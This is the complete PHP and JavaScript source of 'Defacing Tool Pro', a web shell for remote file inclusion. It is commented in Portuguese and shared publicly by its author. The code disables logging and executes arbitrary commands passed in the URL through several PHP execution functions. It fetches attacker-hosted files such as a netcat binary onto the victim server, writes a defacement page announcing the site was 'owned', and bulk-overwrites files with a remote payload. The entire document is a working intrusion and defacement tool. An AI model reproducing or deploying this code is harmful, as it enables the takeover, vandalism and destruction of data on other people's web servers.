<!--
Defacing Tool Pro v1.7 comentado by r3v3ng4ns
Autor: r3v3ng4ns - revengans@hotmail.com
Modifique, copie e distribua mas, por favor, mantenha o nome dos autores originais

A minha intencao inicial sempre foi deixar o script publico, apesar da decisao do meu grupo de deixa-lo priv8.
Mas, deixando-o priv8, ele poderia parar por aqui. Por isso, fiz essa versao comentada do script, e estou tornando-a
publica. Espero que voces desenvolvam cada vez mais o script, melhorem ele e, por favor, deixando o nome dos autores
originais. Peço ainda que vcs me enviem um email (revengans@hotmail.com) com a versao do script que voces fizeram.
Por enquanto, soh tornei publico e comentado o pro17 (a parte principal da cmd). Os scripts complementares eu ainda
vou comenta-los mas, apesar das ferias, ainda estou sem tempo :P. E passo depois os comentarios para ingles...

ps. : eu sei que o filh0te vai ficar puto da vida pq eu estou fzendo isso, mas eu posso :P
pps.: essa versao aqui eh a mesma que era priv8. com excessao de que esta comentada (e muito. acho q exagerei).
ppps: desligue o wordwrap (quebra de linha) do seu editor para visualizar da maneira correta o codigo.


//-> r3v3ng4ns
//-> there's no patch for the stupidity of mankind
-->
<?php
@closelog();//desliga o system logger
@error_reporting(0);//desativa a exibicao de erros. ligue isto aki para qndo for testar o script no seu pc.

// Variaveis que o script usa
$vers="1.7.2 comentado (ex-priv8)";//versao do script
$remote_addr="http://127.0.0.1/~snagnever/defacement/paginanova/";//endereco remoto da pasta aonde estao os scripts
$format_addr=".txt";//extensao dos arquivos dos scripts
$cmd_addr=$remote_addr."pro17".$format_addr;//nome do arquivo do script da cmd (esse aqui, o script principal)
$safe_addr=$remote_addr."safe17".$format_addr;//nome do arquivo do script do dtool em safemode
$writer_addr=$remote_addr."writer17".$format_addr;//nome do arquivo do script que escreve no diretorio
$phpget_addr=$remote_addr."get17".$format_addr;//nome do arquivo do script que faz download de arquivos
$feditor_addr=$remote_addr."feditor".$format_addr;//nome do arquivo do script que edita arquivos online
$put_addr=$remote_addr."feditor_put".$format_addr;//nome do arquivo do script que salva os arquivos editados
$total_addr="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];//endereco do servidor que esta sendo invadido
$chdir=$_GET['chdir'];//pega a variavel $chdir na url do navegador (?chdir=...)
if($chdir=="")$chdir=getcwd();//se a variavel $chdir for vazia, ele a determina como o diretorio atual

//pega as variaveis usadas no script da url do navegador (www.com.br/index.php?fu=1&list=1&cmd=id)
$fu=$_GET['fu'];//para definir qual metodo (funcao) sera usada para enviar o comando pelo script para o sistema
$list=$_GET['list'];//para listar as cartas em modo texto com links clicaveis
$cmd=$_GET['cmd'];//o comando que serah enviado para o sistema

$cmd=stripslashes($cmd);//tira backslashs a mais do cmd
$ch_msg="";//define a msg de erro do 'chdir' como vazia

//pega informacoes do usuario atual (normalmente apache ou nobody)
$login=@posix_getuid();
$euid=@posix_geteuid();
$gid=@posix_getgid();

// Comando CHDIR do dtool. serah comentado parte a parte
//reconhece se ha a string 'chdir' na variavel $cmd e verifica se a posicao dessa string eh 0,
//ou seja, a primeira da linha. todos os !==false poderiam ser tirados, mas assim facilita o
//entendimento
if (strpos($cmd, 'chdir')!==false and strpos($cmd, 'chdir')=='0'){

   //se sim, explode a variavel $cmd, separando-a por ' '(espacos em branco) num array $boom
   //sendo assim, boom['0'] eh a string 'chdir', e boom['1'] eh o diretorio no qual o usuario
   //deseja entrar e o restante dos comandos (separados por ';')
   $boom = explode(" ",$cmd,2);

   //explode o $boom['1'] separando a string por ';', para separar o diretorio no qual o usuario
   //deseja ir e o restantes dos comandos, na array $boom2. sendo assim, $boom2['0'] eh o diretorio
   //que o usuario deseja ir e $boom2['1'] eh o restante dos comandos.
   $boom2 = explode(";",$boom['1'], 2);
   $diretorio = $boom2['0'];//aqui define $diretorio como $boom2['0']

   if($boom['1']=="/")$chdir="";//se o usuario desejar ir ao diretorio root ('/'), a variavel $chdir aqui
   				//eh definida como '' pois, mais para frente, ele recebera o valor '/'.

   //mas se o comando dado pelo usuario contiver 'chdir ..', isso quer dizer que o usuario deseja subir
   //um nivel.
   else if(strpos($cmd, 'chdir ..')!==false){

     //aqui ele primeio explode o $chdir (que agora eh o diretorio atual em que o usuario esta) por '/' e
     //depois inverte a ordem das arrays, sendo que, agora, o $cadaDir['0'] eh o ultimo diretorio em que
     //o usuario esta (ou seja, se $chdir fosse '/etc/httpd/conf/php' o $cadaDir['0'] seria 'php'
     $cadaDir = array_reverse(explode("/",$chdir));

     //se o ultimo diretorio for vazio, isso quer dizer q $chdir estava no formato '/etc/httpd/conf/php/' ou seja,
     //tinha uma '/' no final. sendo assim, o $lastDir serah a $cadaDir['1']. e adiciona-se uma '/' a variavel.
     if($cadaDir['0']=="" or $cadaDir['0'] ==" ") $lastDir = $cadaDir['1']."/";

     //se nao for vazio, o $lastDir vai ser o $cadaDir['0'] mesmo, e adiciona-se uma '/' a variavel $lastDir,
     //que, seguindo o exemplo de $chdir='/etc/httpd/conf/php', entao $lastDir seria ='php/.
     //alem disso tudo acima, o $chdir agora recebe uma '/' como ultima caractere
     else{ $lastDir = $cadaDir['0']."/"; $chdir = $chdir."/";}

     //agora, da string $diretorio remove-se $lastDir. ou seja:
     //sendo $diretorio='/etc/httpd/conf/php/'
     //e $lastDir='php/'
     //remove-se 'php/' de '/etc/httpd/conf/php/', tornando $diretorio='/etc/httpd/conf/'
     $diretorio = str_replace($lastDir,"",$chdir);

     //com a possibilidade de um imprevisto ocorrer aih em cima, novamente se o usuario quiser ir ao diretorio
     //root ('/'), o $diretorio eh definido como '', (vazio)
     if($diretorio=="/")$chdir="";
   }
   //se houver uma '/' como ultima caractere da string $diretorio, remove-se ela.
   if(strrpos($diretorio,"/")==(strlen($diretorio)-1)) $diretorio=substr($diretorio,0,strrpos($diretorio,"/"));

   //se for possivel abrir o diretorio, define o $chdir como = $diretorio, para usa-lo mais lah em baixo,
   //no envio do comando para o sistema e para mante-lo na url
   if(@opendir($chdir."/".$diretorio)!==false) $chdir=$chdir."/".$diretorio;
   else if(@opendir($diretorio)!==false) $chdir=$diretorio;

   //se nao for possivel entra no dir, define a msg de erro.
   else $ch_msg="dtool: line 1: chdir: $diretorio: No such directory or permission denied.\n";
   if($boom2['1']==null) $cmd = $boom['2']; else $cmd = $boom2['1'].$boom2['2'];
}
//define o comando que serah mostrado para o usario o que o comando eh ateh aki
//mais para baixo, o comando que efetivamente serah enviado para o sistema serah modificado
$cmdshow=$cmd;

//se as variaveis estiverem definidas, aqui sao definidas os $show* para mante-los na url em cada envio
//de comando do usuario.
if($chdir==getcwd() or empty($chdir) or $chdir=="")$showdir="";else $showdir="+'chdir=$chdir&'";
if($fu=="" or $fu=="0" or empty($fu))$showfu="";else $showfu="+'fu=$fu&'";//se $fu for definida, mantem ele na url
if($list=="" or $list=="0" or empty($list)){$showfl="";$fl="on";}else{$showfl="+'list=1&'"; $fl="off";}

//procura alguns arquivos que mais tarde podem ser uteis ao usuario
if (@is_dir("/usr/X11R6/")) $pro0="<i>X11</i> at /usr/X11R6/, ";//procura a pasta do x11
if (@file_exists("/usr/X11R6/bin/xterm")) $pro1="<i>xterm</i> at /usr/X11R6/bin/xterm, ";//procura o xterm
if (@file_exists("/usr/bin/nc")) $pro2="<i>nc</i> at /usr/bin/nc, ";//procura o netcat
if (@file_exists("/usr/bin/wget")) $pro3="<i>wget</i> at /usr/bin/wget, ";//procura o wget
if (@file_exists("/usr/bin/lynx")) $pro4="<i>lynx</i> at /usr/bin/lynx, ";//procura o lynx
if (@file_exists("/usr/bin/gcc")) $pro5="<i>gcc</i> at /usr/bin/gcc, ";//procura o gcc
if (@file_exists("/usr/bin/cc")) $pro6="<i>cc</i> at /usr/bin/cc ";//procura o cc
$pro=$pro0.$pro1.$pro2.$pro3.$pro4.$pro5.$pro6;//junta tudo numa variavel

$ip=@gethostbyname($_SERVER['HTTP_HOST']);//mostra o ip do usuario

//arqui, se a $cmd tiver o comando 'ls', adiciona-se o parametro '-F' aa 'ls', deixando
//'ls -F', mas procura-se manter os outros parametros que o usuario deixou para o ls.
//par isso definiu o $cmdshow lah em cima, isso aqui o usuario nao sabe. o parametro
//'-F' no ls facilita a visualizacao dos arquivos.
if(strpos($cmd, 'ls --') !==false){ $cmd = str_replace('ls --', 'ls -F --', $cmd);}
else if(strpos($cmd, 'ls -') !==false){ $cmd = str_replace('ls -', 'ls -F', $cmd);}
else if(strpos($cmd, ';ls') !==false){ $cmd = str_replace(';ls', ';ls -F', $cmd);}
else if(strpos($cmd, '; ls') !==false){ $cmd = str_replace('; ls', ';ls -F', $cmd);}
else if($cmd=='ls'){$cmd = "ls -F";}

//se houverem '//' no $chdir, aki sao removidas
if(strpos($chdir, '//') !==false) $chdir = str_replace('//', '/', $chdir);
?>
<body onload="window.document.c.comando.focus();window.document.c.comando.select();">
<style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
.infop{font-family: verdana; font-size: 10px; color:#000000;}
.infod{font-family: verdana; font-size: 10px; color:#414978;}
.algod{font-family: verdana; font-size: 12px; font-weight: bold; color: #414978;}
.titulod{font:Verdana; color:#414978; font-size:20px;}</style>
<script>
//aqui sao as funcoes do javascript, que sao chamadas ao enviar o form, ou ao clicar num botao das ferramentas do dtool

//Variavel de Include
//essa funcao descobre a variavel que eh usada na pagina vulneravel para injetar o codigo
//malicioso. eh aquela variavel que vem depois do '?' e antes do '='. tipo:
//www.com.br/index.php?site=   ----> aqui no caso, a inclvar eh 'site'
function inclVar(){
	var addr = location.href.substring(0,location.href.indexOf('?')+1);
	var stri = location.href.substring(addr.length,location.href.length+1);
	inclvar = stri.substring(0,stri.indexOf('='));
}

//essa funcao envia o comando para o sistema, colocando-o na url do navegador.
//a funcao enviaCMD() estah colocada no evento onSubmit do form, o que quer dizer que antes
//da form ser enviada, ele executara a funcao. se a funcao retornar true, a form eh enviada. caso
//contrario, a form nao eh enviada. mas nao keremos que a form seja enviada, keremos simplismente
//que seja definido o cmd que o usuario escolheu na url do browser. por isso, essa funcao sempre retorna
//false
function enviaCMD(){
	inclVar();//chama a funcao para definir a variavel de include
	window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu.$showfl;?>+'cmd='+window.document.c.comando.value;
	return false;//isso aqui evita que o form seja enviado.
}

//essa funcao eh para alterar o metodo (a funcao do php) que serah usado para enviar o cmd para o sistema
//ela estah colocada no evento OnSelect do pulldown de metodos ('using ...') do dtool.
//esta aqui o grande diferencial do dtool. ele utiliza pode utilizar varias funcoes do php para enviar o comando
//para o sistema, enquanto a grande maioria das cmds (todas que eu jah vi) utilizam apenas 3: passthru(), system() e
//exec(), e ainda assim, nao trabalham de forma correta com o exec().
//Na maior parte das vezes, o servidor nao esta realmente em Safemode, pois (para admins amadores :P) isso causaria
//mto problema de compatibilidade nos scripts dos clientes que hospedam a pagina. Por isso, esses admins teem o costume
//de simplismente desativar o passthru, o system e o exec, "tornando o servidor muito mais seguro".
function ativaFe(qual){
	inclVar();//chama a funcao para definir a variavel de include
	window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfl;?>+'fu='+qual+'&cmd='+window.document.c.comando.value;
	return false;//isso aqui evita que o form seja enviado.
}

//PHPget
//funcao que abre prompts perguntando para o usuario informacoes que o phpget precisa para fazer o
//download do arquivo.
function PHPget(){
	inclVar();//chama a funcao para definir a variavel de include
	var c=prompt("[ PHPget ] by r3v3ng4ns\nDigite a ORIGEM do arquivo (url) com ate 7Mb\n-Utilize caminho completo\n-Se for remoto, use http:// ou ftp://:","http://www.colegioparthenon.com.br/dirativo/bd/nc.gif");
	var dir = c.substring(0,c.lastIndexOf('/')+1);//descobre qual eh o diretorio
	var file = c.substring(dir.length,c.length+1);//descobre o nome do arquivo.
	var p=prompt("[ PHPget ] by r3v3ng4ns\nDigite o DESTINO do arquivo\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file);
	window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$phpget_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'c='+c+'&p='+p);
}

//PHPwriter
//funcao que abre prompts perguntando para o usuario informacoes que o phpwriter precisa para escrever
//a index no servidor.
function PHPwriter(){
	inclVar();//chama a funcao para definir a variavel de include
	var url=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite a URL do frame","http://www.geocities.com/revensite/index.htm");
	var dir = url.substring(0,url.lastIndexOf('/')+1);//descobre qual eh o diretorio
	var file = url.substring(dir.length,url.length+1);//descobre o nome do arquivo.
	var f=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Nome do arquivo a ser criado\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file);
	t=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Title da pagina","[ r00ted team ] owned you :P");
	window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$writer_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'url='+url+'&f='+f+'&t='+t);
}

//Resumo
//funcao que abre uma janela contendo informacoes importantes para o usuario
//guardar num arquivo, possivelmente, nas proximas versoes, essa funcao deixara de existir.
function resumir() {
	inclVar();//chama a funcao para definir a variavel de include
	resumo='<DIV STYLE="font-family: verdana; font-size: 11px;"><b> <?=$total_addr;?>?'+inclvar+'=<?=$cmd_addr;?></b><br><?php
 $uname = posix_uname();
 while (list($info, $value) = each ($uname)) { ?><b><?= $info ?>:</b> <?= $value ?><br><?php } ?><b>default user:</b> uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)<br><b>ip: </b> <?=$ip;?><br><b>server info: </b><?="$SERVER_SOFTWARE $SERVER_VERSION";?><br><b>pro info: </b><?=$pro;?><br><b>path da pagina: </b><?= getcwd() ?><br><b>path writable:</b><? if(@is_writable(getcwd())){ echo " <b>YES</b>"; }else{ echo " no"; } ?>'
	jan=open("","jan","width=580,height=300,menubar=yes,scrollbars=yes,resizable=yes,");
	jan.document.write(resumo);jan.document.write("<p> <? echo str_repeat("==", 35)?></p>");
	jan.document.title="Resumo do servidor";jan.focus();
}

//PHPfilEditor
//funcao que abre um prompt perguntando para o usuario o nome do arquivo que serah aberto
//com o phpfileditor
function PHPf(){
	inclVar();//chama a funcao para definir a variavel de include
	var o=prompt("[ PHPfilEditor ] by r3v3ng4ns\nDigite o nome do arquivo que deseja abrir\n-Utilize caminho completo\n-Abrir arquivos remotos, use http:// ou ftp://","<?=$chdir;?>/index.php");
	var dir = o.substring(0,o.lastIndexOf('/')+1);//descobre kual eh o diretorio
	var file = o.substring(dir.length,o.length+1);//descobre o nome do arquivo.
	window.open('<?=$total_addr;?>?'+inclvar+'=<?=$feditor_addr;?>?&inclvar='+inclvar+'&o='+o);
}

//SafeMode
//abre o dtool no modo em safemode
function safeMode(){
	inclVar();//chama a funcao para definir a variavel de include
	if (confirm ('Deseja ativar o DTool com suporte a SafeMode?')){
		window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$safe_addr;?>'+'&'<?=$showdir;?>;
	}else{ return false }
}

//FileListing
//lista os arquivos em modo texto, com links clicaveis para acesso de diretorio e edicao de arquivos
function list(turn){
	inclVar();//chama a funcao para definir a variavel de include
	if(turn=="off")turn=0;
	else if(turn=="on")turn=1;
	window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu;?>+'list='+turn+'&cmd='+window.document.c.comando.value;
	return false;
}

//Overwrite Files
//ativa o script para substituir arquivos com uma dada palavra chave.
function overwrite(){
	inclVar();//chama a funcao para definir a variavel de include
	if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){
		keyw=prompt("Digite a palavra chave",".jpg");
		newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");
		if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){
			trydel=1
			}else{trydel=0}
			if(confirm("Deseja substituir todos os arquivos do diretorio\n<?=$chdir;?> que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){
				window.location.href='<?=$total_addr;?>?'+inclvar+'=<?=$cmd_addr;?>?&chdir=<?=$chdir;?>&list=1&'<?=$showfu?>+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;
			}
		}
	}
</script>
<table width="690" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v<?=$vers;?> ] <a href="javascript:window.open('<?=$remote_addr;?>help.txt');">?</a><br>
<font size=2>by r3v3ng4ns - revengans@hotmail.com </font>
</b></div></td></tr>
<tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
<?php
 $uname = @posix_uname();
 while (list($info, $value) = each ($uname)) { ?>
<TR><TD><DIV class="infop"><b><?=$info ?>:</b> <?=$value;?></DIV></TD></TR><?php } ?>
<TR><TD><DIV class="infop"><b>user:</b> uid(<?=$login;?>) euid(<?=$euid;?>) gid(<?=$gid;?>)</DIV></TD></TR>
<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>server info: </b><?="$SERVER_SOFTWARE $SERVER_VERSION";?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>pro info: ip </b><?="$ip, $pro";?></DIV></TD></TR>
<? if($chdir!=getcwd()){?>
<TR><TD><DIV class="infop"><b>original path: </b><?=getcwd() ?></DIV></TD></TR><? } ?>
<TR><TD><DIV class="infod"><b>current path: </b><?=$chdir ?>
</DIV></TD></TR></TABLE></td></tr>
<tr><td><form name="c" id="c" method="post" action="#" onSubmit="return enviaCMD()">
<table width="375" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#414978"><tr><td><table width="370" border="0" align="center" cellpadding="1" cellspacing="1" bgcolor="white"><tr>
<td width="75"><DIV class="algod">command</DIV></td>
<td width="300"><input name="comando" type="text" id="comando" value='<?=$cmdshow;?>' style="width:295; font-size:12px" class="campo">
</td></tr></table><table><tr><td>
<?php
if(isset($chdir)) @chdir($chdir);//aqui muda o diretorio que o script trabalha para o definido em $chdir
ob_start();

//As funcoes abaixo trabalham de forma correta com o output das funcoes de php usadas,
//o que normalmente as cmds nao fazem...
function safemode($what){//como ultimo recurso, mostra que o srv estah em safemode
	//'outputeia' uma msg de erro, supondo q o srv esteja em safemode
	echo "It seems that this server is using php in safemode. Try to use DTool in Safemode.";
}
function popenn($what){//envia o cmd para o sistema usando popen()
	$handle=popen("$what", "r");//o popen funciona semelhante ao fopen
	$out=@fread($handle, 2096);//coloca numa variavel o retorno
	echo $out;//'outputeia' o retorno
	@pclose($handle);
}
function execc($what){//envia o cmd para o sistema usando exec()
	exec("$what",$array_out);//o exec() recebe o retorno em arrays.
	$out=@implode("\n",$array_out);//aqui junta as arrays
	echo $out;//aqui 'outputeia' o retorno
}
function shell($what){//envia o cmd para o sistema usado shell_exec() (tb conhecido como `backtik operator`)
echo(shell_exec($what));//'outputeia' o retorno
}
$funE="function_exists";//para encurtar o nome abaixo... :P
//testa quais funcoes existem, para detectar automaticamente qual metodo
//sera usado para enviar a funcao para o sistema
if($funE('passthru')){$fe="passthru";$feshow=$fe;}
elseif($funE('system')){$fe="system";$feshow=$fe;}
elseif($funE('exec')){$fe="execc";$feshow="exec";}
elseif($funE('popen')){$fe="popenn";$feshow="popen";}
elseif($funE('shell_exec')){$fe="shell";$feshow="shell_exec";}
else {$fe="safemode";$feshow=$fe;}

//se o usuario tiver definido qual metodo serah usado para enviar o cmd
//para o sistema, aki ele eh reconhecido/definido.
if($fu!="" or !empty($fu)){
  if($fu==1){$fe="passthru";$feshow=$fe;}
  if($fu==2){$fe="system";$feshow=$fe;}
  if($fu==3){$fe="execc";$feshow="exec";}
  if($fu==4){$fe="popenn";$feshow="popen";}
  if($fu==5){$fe="shell";$feshow="shell_exec";}
}
//executa o comando usando o metodo escolhido pelo usuario, e
//faz com que a saida de erro apareca na tela ( com o '2>&1')
$fe("$cmd  2>&1");
$output=ob_get_contents();ob_end_clean();
?>
<td><input type="button" name="snd" value="send cmd" class="campo" style="background-color:#313654" onClick="enviaCMD()"><select name="qualf" class="campo" style="background-color:#313654" onchange="ativaFe(c.qualf.value);">
<option><?="using $feshow()";?>
<option value="1">use passthru()
<option value="2">use system()
<option value="3">use exec()
<option value="4">use popen()
<option value="5">use shell_exec()
<option value="0">auto detect (default)
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="resBtn" value="resumo" class="campo" onClick="resumir()"><input type="button" name="listBtn" value="list files <?=$fl;?>" class="campo" onClick="list('<?=$fl;?>')"><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
</tr></table></td></tr></table></form></td></tr>
<tr><td align="center"><DIV class="algod"><br>stdOut from <?="\"<i>$cmdshow</i>\", using <i>$feshow()</i>";?></i></DIV>
<TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
<?php
echo $ch_msg;
if (empty($cmd) and $ch_msg=="") echo ("Comandos Exclusivos do DTool Pro\n\nchdir &lt;diretorio&gt;; outros; cmds;\nMuda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. ex: chdir /diretorio/sub/;pwd;ls\n\nPHPget, PHPwriter, Fileditor, File List e Resumo\nfale com o r3v3ng4ns :P");
if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?></TEXTAREA><BR></td></tr>
<?php
if($list=="1") include($remote_addr."flist.txt");
?>
</table>
